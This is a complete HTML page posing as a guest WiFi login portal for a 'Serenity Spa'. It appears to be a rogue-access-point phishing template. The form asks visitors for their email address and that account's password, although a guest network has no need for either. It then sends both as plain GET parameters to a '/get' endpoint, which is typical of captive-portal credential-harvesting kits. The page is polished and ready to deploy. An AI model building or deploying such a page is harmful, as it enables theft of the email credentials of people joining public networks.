<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Serenity Spa — Guest WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f0ede8;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:390px;background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.06)}
.top{background:linear-gradient(160deg,#5a7a6a,#3a5a5a);padding:34px 28px 26px;text-align:center}
.spa-icon{font-size:28px;margin-bottom:10px;filter:grayscale(0.3)}
.spa-name{font-size:20px;font-weight:300;color:#fff;letter-spacing:4px;text-transform:uppercase}
.spa-sub{font-size:9px;color:rgba(255,255,255,0.6);letter-spacing:2.5px;text-transform:uppercase;margin-top:6px}
.ssid-pill{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,0.1);border-radius:20px;padding:5px 14px;margin-top:14px;border:1px solid rgba(255,255,255,0.15)}
.dot{width:6px;height:6px;background:#a8e6b8;border-radius:50%}
.ssid-pill span{font-size:11px;color:rgba(255,255,255,0.6)}
.ssid-pill strong{color:rgba(255,255,255,0.85);font-weight:500}
.body{padding:28px}
h2{font-size:16px;font-weight:600;color:#3a5a5a;margin-bottom:4px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:18px}
.lbl{display:block;font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:1.5px;color:#aaa;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:11px 13px;border:1.5px solid #eae8e4;border-radius:8px;font-size:14px;background:#faf8f5;color:#3a5a5a}
input:focus{outline:none;border-color:#5a7a6a;box-shadow:0 0 0 3px rgba(90,122,106,0.08)}
input::placeholder{color:#ccc}
.btn{width:100%;padding:13px;margin-top:22px;border:none;border-radius:8px;background:#5a7a6a;color:#fff;font-size:13px;font-weight:600;letter-spacing:0.5px;cursor:pointer}
.terms{font-size:11px;color:#ccc;text-align:center;margin-top:13px;line-height:1.6}
.terms a{color:#5a7a6a}
.foot{background:#faf8f5;border-top:1px solid #eae8e4;padding:12px 28px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#ccc;text-decoration:none}
.foot a{color:#5a7a6a}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="spa-icon">🌿</div>
    <div class="spa-name">Serenity</div>
    <div class="spa-sub">Wellness &amp; Spa</div>
    <div class="ssid-pill"><div class="dot"></div><span>Network: <strong>Serenity-Guest</strong></span></div>
  </div>
  <div class="body">
    <h2>Relax &amp; Connect</h2>
    <p class="sub">Complimentary WiFi for all spa guests and visitors.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect to WiFi</button>
      <p class="terms">By connecting you agree to our <a href="#">Guest WiFi Policy</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Serenity Spa &amp; Wellness</span><a href="#">Help</a></div>
</div>
</body>
</html>
